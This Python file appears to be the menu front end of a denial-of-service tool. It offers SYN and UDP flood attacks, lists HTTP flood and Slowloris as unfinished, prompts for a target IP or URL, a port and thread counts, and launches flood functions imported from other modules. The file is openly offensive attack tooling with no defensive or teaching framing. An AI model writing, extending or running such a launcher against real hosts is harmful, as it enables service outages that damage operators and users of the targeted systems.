from utils import *
from syn import *
from udp import *

def control():
    RED = "\033[31m"
    RESET = "\033[0m"
    warning()

    opcao = int(input(f'''
 CONTROL PANEL ! (If you're not a {RED}superuser{RESET}
                      get out )
___________________________________________________
                                         
1 - SYN FLOOD
2 - UDP FLOOD
3 - HTTP FLOOD {RED}(Not finished yet){RESET}
4 - Slowloris Attack {RED}(Not finished yet){RESET}
___________________________________________________
                                           
Choose wisely: ''').strip())
    
    if(opcao == 1):
        clear()
        target = input("Target (IP or url) >> ").strip()
        port = int(input("Target port >> "))
        num = int(input("Number of threads >> "))
        numwor = int(input("Number of workens (default 200) >> "))
        synflood(target, port, num, numwor)

        clear()
        results(target, port, num)
    elif(opcao == 2):
        clear()
        target = input("Target (IP or url) >> ").strip()
        port = int(input("Target port >> "))
        num = int(input("Number of threads >> "))
        numwor = int(input("Number of workens (default 200) >> "))
        udpflood(target, port, num)

        clear()
        results(target, port, num)

control()
    